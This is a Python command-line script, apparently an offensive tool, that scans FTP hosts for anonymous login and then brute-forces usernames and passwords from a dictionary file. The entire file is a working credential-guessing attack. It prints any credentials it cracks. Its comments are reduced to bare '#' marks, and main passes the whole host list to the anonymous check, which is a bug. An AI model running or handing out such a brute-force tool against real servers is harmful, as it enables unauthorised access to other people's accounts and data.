#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ftplib import *
import argparse
import time

#
def anonScan(hostname):				#
	try:
		with FTP(hostname) as ftp:	#
			ftp.login()				#
			print('\n[*] ' + str(hostname) + " FTP Anonymous login successful!") 	#
			return True
	except Exception as e:			#
		print('\n[]' + str(hostname) + " FTP  Anonymous logon failure!")
		return False


#
def vlcLogin(hostname, pwdFile):
	try:
		with open(pwdFile, 'r') as pf:			#
			for line in pf.readlines():			#
				time.sleep(1)
				userName = line.split(':')[0]	#
				passWord = line.split(':')[1].strip('\r').strip('\n')		#
				print('[+] Trying: ' + userName + ':' + passWord)
				try:
					with FTP(hostname) as ftp: 		#
						ftp.login(userName, passWord)

						#
						print('\n[+] ' +str(hostname) + 'FTP login successful: '+ userName + ':' + passWord)
						return (userName, passWord)
				except Exception as e:
					#
					pass
	except IOError as e:
		print('Error: the password file does not exist!')
	print('\n[-] Cannot crackthe FTP password, please change the password dictionary try again!')
	return (None, None)


def main():
	#
	parser =argparse.ArgumentParser(description='FTP Scanner')
	#
	parser.add_argument('-H', dest='hostName', help='The host list with ","space')
	parser.add_argument('-f',dest='pwdFile', help='Password dictionary file')
	options = None
	try:
		options= parser.parse_args()
	except:
		print(parser.parse_args(['-h']))
		exit(0)

	hostNames = str(options.hostName).split(',')
	pwdFile = options.pwdFile
	if hostNames== ['None']:
		print(parser.parse_args(['-h']))
		exit(0)

	for hostName in hostNames:
		username = None
		password = None
		if anonScan(hostNames) == True:
			print('Host: ' + hostName + ' Can anonymously!')
		elif pwdFile != None:
			(username, password) = vlcLogin(hostName, pwdFile)
			if password != None:
				print('\n[+] Host: ' + hostName + ' Username: ' + username + 'Password: ' + password)

	print('\n[*]--------------Scan End!---------------[*]')

if __name__ == '__main__':
	main()

				 